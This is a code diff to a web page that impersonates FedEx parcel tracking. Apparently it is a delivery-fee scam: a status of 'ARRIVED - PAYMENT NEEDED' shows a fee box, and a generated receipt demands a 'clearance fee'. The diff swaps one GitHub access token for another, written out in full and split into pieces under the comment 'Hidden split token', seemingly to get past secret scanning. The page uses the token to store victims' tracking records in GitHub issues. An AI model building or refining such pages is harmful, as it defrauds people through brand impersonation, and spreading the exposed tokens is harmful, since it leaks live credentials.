@@ -29,12 +29,10 @@
 
     <div id="details" class="result">
         <p style="margin:5px 0;"><strong>Route:</strong> <br><span id="vFrom"></span> → <span id="vTo"></span></p>
-        
         <div class="time-row">
             <span>🚀 <b>Departed:</b><br><span id="vTimeFrom"></span></span>
             <span>🏁 <b>Estimated:</b><br><span id="vTimeTo"></span></span>
         </div>
-
         <p style="margin:10px 0;"><strong>Status:</strong> <span id="vStatus" class="status-txt"></span></p>
         
         <div id="vFeeBox" class="fee-alert">
@@ -65,11 +63,11 @@
 </div>
 
 <script>
-    // Your NEW token: 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
-    const s1 = "ghp_8DQBzoJ8";
-    const s2 = "EtBxG0giz1Jo7G";
-    const s3 = "WaACauQE1bg36B";
-    const KEY = s1 + s2 + s3;
+    // Hidden split token
+    const p1 = "Ghp_4m5gCgb6";
+    const p2 = "7N0kA63B6u2rbiPV";
+    const p3 = "CYfBmU0AUmG3";
+    const KEY = p1 + p2 + p3;
     
     const USER = "FedEx76"; 
     const REPO = "FedEx-tracking-"; 
@@ -93,11 +91,13 @@
                 document.getElementById('vTimeTo').innerText = currentData.timeTo || "TBD";
                 document.getElementById('vStatus').innerText = currentData.status;
 
-                // Triggers payment box if status matches
+                // Trigger payment box only for Arrived status
                 if(currentData.status === "ARRIVED - PAYMENT NEEDED") {
                     document.getElementById('vFeeBox').style.display = 'block';
                     document.getElementById('vFee').innerText = currentData.fee;
-                } else { document.getElementById('vFeeBox').style.display = 'none'; }
+                } else { 
+                    document.getElementById('vFeeBox').style.display = 'none'; 
+                }
             } else { alert("Tracking ID not found."); }
         } catch(e) { alert("Error connecting."); }
     }
@@ -121,8 +121,10 @@
                 headers: { 'Authorization': `token ${KEY}`, 'Content-Type': 'application/json' },
                 body: JSON.stringify({ title: `ID: ${id}`, body: JSON.stringify(packet), labels: [id] })
             });
-            if(response.ok) { alert("Saved Successfully!"); document.getElementById('adminBox').style.display='none'; }
-            else { 
+            if(response.ok) { 
+                alert("Saved Successfully!"); 
+                document.getElementById('adminBox').style.display='none'; 
+            } else { 
                 const err = await response.json();
                 alert("GitHub Error: " + err.message); 
             }
@@ -144,19 +146,10 @@ FROM        : ${currentData.from}
 TO          : ${currentData.to}
 DEPARTED    : ${currentData.timeFrom}
 ARRIVED     : ${currentData.timeTo}
-
 --------------------------------
 TOTAL DUE   : ${currentData.fee}
 --------------------------------
 STATUS      : PENDING CLEARANCE
-
-Note: Delivery is currently 
-paused. Please settle the 
-clearance fee to resume 
-immediate doorstep delivery.
-
---------------------------------
-     Thank you for using Fedex
 --------------------------------`;
         const blob = new Blob([receipt], { type: 'text/plain' });
         const link = document.createElement('a');
